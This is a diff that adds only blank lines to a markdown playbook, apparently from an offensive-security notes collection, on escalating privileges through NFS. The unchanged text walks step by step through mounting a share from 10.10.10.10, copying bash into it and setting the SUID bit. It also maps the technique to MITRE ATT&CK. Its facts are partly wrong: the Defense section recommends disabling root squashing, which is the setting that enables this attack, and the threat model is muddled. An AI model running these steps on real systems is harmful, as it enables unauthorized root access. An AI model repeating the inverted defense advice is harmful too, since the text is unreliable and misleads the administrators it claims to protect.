@@ -36,6 +36,8 @@ Linux systems often use NFS to share files and directories between multiple mach
 
 Linux systems often use NFS to share files and directories between multiple machines. NFS Root Squashing is a feature that prevents NFS clients from accessing files owned by root on the NFS server. However, if a user on the NFS client machine has access to a directory that is owned by root on the NFS server, they can use this to escalate their privileges on the NFS client machine. The attacker can export a file on the NFS server that contains a malicious script or binary, mount the exported directory on the client machine, and then execute the script or binary with SUID permission to gain elevated privileges. This technique can be used to gain access to sensitive files or to execute commands with elevated privileges on the client machine.
 
+ 
+
 ## Requirements
 
 1. Access to a directory owned by root on the NFS server
@@ -46,6 +48,8 @@ Linux systems often use NFS to share files and directories between multiple mach
 
 1. Ability to set SUID permission on a script or binary
 
+ 
+
 ## Defense
 
 1. Disable NFS Root Squashing to prevent attackers from exploiting this vulnerability
@@ -54,25 +58,39 @@ Linux systems often use NFS to share files and directories between multiple mach
 
 1. Monitor NFS activity for suspicious behavior
 
+ 
+
 ## Objectives
 
 1. Gain elevated privileges on the NFS client machine
 
 1. Access sensitive files on the NFS client machine
 
+ 
+
 # Instructions
 
 1. The exports file is used by NFS (Network File System) to determine which file systems to export to remote hosts. It contains a list of directories that are available for remote mounting and the access level that is granted to each remote system.
 
+ 
+
+
+
 **Code**: [[/etc/exports]]
 
+
+
 > This command simply provides the location of the exports file on the system, which is typically located at /etc/exports. This file can be edited to control which directories are exported and what level of access is granted to remote systems.
+
+
 
 **Command** ([[Read /etc/exports file]]):
 
 ```bash
 cat /etc/exports
 ```
+
+
 
 2. Follow these instructions to mount an NFS directory and set SUID permission on bash shell:
 1. Check the remote name of the folder using the command 'showmount -e 10.10.10.10'.
@@ -82,10 +100,18 @@ cat /etc/exports
 5. Copy the desired shell using the command 'cp /bin/bash .'.
 6. Set SUID permission on the bash shell using the command 'chmod +s bash'.
 
+ 
+
+
+
 **Code**: [[# remote check the name of the folder
 showmount -e]]
 
+
+
 > The above commands are used to mount an NFS directory and set SUID permission on bash shell. The 'showmount' command is used to check the remote name of the folder. The 'mkdir' command is used to create a directory. The 'mount' command is used to mount the directory. The 'cd' command is used to navigate to the mounted directory. The 'cp' command is used to copy the desired shell. The 'chmod' command is used to set SUID permission on the bash shell.
+
+
 
 **Command** ([[Remote check for folder name]]):
 
@@ -93,11 +119,19 @@ showmount -e]]
 showmount -e 10.10.10.10
 ```
 
+
+
+
+
 **Command** ([[Create directory]]):
 
 ```bash
 mkdir /tmp/nfsdir
 ```
+
+
+
+
 
 **Command** ([[Mount directory]]):
 
@@ -106,17 +140,27 @@ mount -t nfs 10.10.10.10:/shared /tmp/nfsdir
 cd /tmp/nfsdir
 ```
 
+
+
+
+
 **Command** ([[Copy shell]]):
 
 ```bash
 cp /bin/bash .
 ```
 
+
+
+
+
 **Command** ([[Set suid permission]]):
 
 ```bash
 chmod +s bash
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -143,3 +187,5 @@ chmod +s bash
 
 - [[Linux - Privilege Escalation]]
 - [[NFS Root Squashing]]
+
+
